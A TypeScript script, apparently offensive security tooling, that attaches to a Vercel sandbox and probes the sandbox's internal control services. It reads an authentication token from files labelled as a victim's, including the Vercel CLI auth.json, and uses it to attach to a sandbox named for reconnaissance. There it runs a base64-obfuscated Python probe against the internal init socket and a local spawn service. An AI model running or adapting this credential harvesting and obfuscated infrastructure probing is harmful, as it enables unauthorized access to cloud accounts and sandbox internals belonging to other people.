import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const B64 = "CmltcG9ydCBzb2NrZXQsIHN0cnVjdCwgdGltZSwganNvbgoKZGVmIGNhbGxfdW5peChwYXRoLCBib2R5KToKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9VTklYLCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzLnNldHRpbWVvdXQoMikKICAgIHMuY29ubmVjdChwYXRoKQogICAgcy5zZW5kYWxsKGJvZHkpCiAgICBvdXQgPSBiJycKICAgIHRyeToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBjID0gcy5yZWN2KDQwOTYpCiAgICAgICAgICAgIGlmIG5vdCBjOiBicmVhawogICAgICAgICAgICBvdXQgKz0gYwogICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgIHBhc3MKICAgIHMuY2xvc2UoKQogICAgcmV0dXJuIG91dAoKZGVmIGNhbGxfdGNwKHBvcnQsIGJvZHkpOgogICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgIHMuc2V0dGltZW91dCgyKQogICAgcy5jb25uZWN0KCgnMTI3LjAuMC4xJywgcG9ydCkpCiAgICBzLnNlbmRhbGwoYm9keSkKICAgIG91dCA9IGInJwogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGMgPSBzLnJlY3YoNDA5NikKICAgICAgICAgICAgaWYgbm90IGM6IGJyZWFrCiAgICAgICAgICAgIG91dCArPSBjCiAgICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6CiAgICAgICAgcGFzcwogICAgcy5jbG9zZSgpCiAgICByZXR1cm4gb3V0CgpTT0NLPScvcnVuL3ZlcmNlbC9zaGFyZS9pbml0LnNvY2snCgpmb3IgdGFyZ2V0LCBuYW1lLCBjYiBpbiBbCiAgICAoJ3VuaXgnLCBTT0NLLCBjYWxsX3VuaXgpLAogICAgKCd0Y3AyMzQ1NicsIDIzNDU2LCBjYWxsX3RjcCksCl06CiAgICBmb3IgcHJvdG8gaW4gWydjb25uZWN0JywgJ2dycGMnXToKICAgICAgICBib2R5ID0gYid7fScKICAgICAgICBpZiBwcm90byA9PSAnY29ubmVjdCc6CiAgICAgICAgICAgIGhlYWRlcnMgPSAoYidQT1NUIC9zcGF3bi5TcGF3blNlcnZpY2UvUGluZyBIVFRQLzEuMVxyXG5Ib3N0OiBsb2NhbGhvc3RcclxuQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uXHJcbkNvbm5lY3QtUHJvdG9jb2wtVmVyc2lvbjogMVxyXG5Db250ZW50LUxlbmd0aDogJWRcclxuXHJcbicgJSBsZW4oYm9keSkpICsgYm9keQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBheWxvYWQgPSBzdHJ1Y3QucGFjaygnPkJJJywgMCwgMCkKICAgICAgICAgICAgaGVhZGVycyA9IChiJ1BPU1QgL3NwYXduLlNwYXduU2VydmljZS9QaW5nIEhUVFAvMS4xXHJcbkhvc3Q6IGxvY2FsaG9zdFxyXG5Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2dycGNcclxuVEU6IHRyYWlsZXJzXHJcbkNvbnRlbnQtTGVuZ3RoOiAlZFxyXG5cclxuJyAlIGxlbihwYXlsb2FkKSkgKyBwYXlsb2FkCiAgICAgICAgdHJ5OgogICAgICAgICAgICByID0gY2IodGFyZ2V0IGlmIHRhcmdldD09J3VuaXgnIGVsc2UgMjM0NTYsIGhlYWRlcnMpCiAgICAgICAgICAgIHByaW50KHRhcmdldCwgcHJvdG8sICctPicsIHJlcHIocls6MzAwXSkpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludCh0YXJnZXQsIHByb3RvLCAnRVJSJywgZSkK";
  const SCRIPT = `
set +e
echo "${B64}" | base64 -d > /tmp/probe3.py
timeout 25 python3 /tmp/probe3.py
echo "===DONE==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });